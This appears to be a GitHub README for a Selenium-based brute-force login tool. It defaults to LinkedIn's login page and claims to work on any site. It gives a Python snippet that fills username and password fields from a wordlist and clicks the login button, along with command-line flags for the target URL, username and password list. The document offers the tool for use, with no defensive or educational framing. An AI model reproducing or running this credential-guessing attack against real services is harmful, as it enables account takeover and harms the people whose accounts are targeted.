# Selenium-Brute-Force
A simple script for doing brute-force attack using selenium.

## Help
- The default script is useful for Linkedin, but it works for everything. For other platforms, it needs to extract username id, password id, and login button class using browser inspector.
![](https://github.com/mohammadkamrani/Selenium-Brute-Force/blob/main/2021-01-20_14-43-37.jpg)
put them in code.
```python
username = driver.find_element_by_id("username")		
username.clear()
print("username: "+curuser)
username.send_keys(curuser)		
password = driver.find_element_by_id("password")
password.clear()
print("password: "+passw+"\n")
password.send_keys(passw)			
driver.find_element_by_class_name('login__form_action_container').click()
```
- -h, --help  show this help message and exit
- -t    target's url: https://www.linkedin.com/uas/login
- -u    username
- -p    wordlist: for example password.txt

![](https://github.com/mohammadkamrani/Brute-Force/blob/main/ezgif.com-video-to-gif.gif)

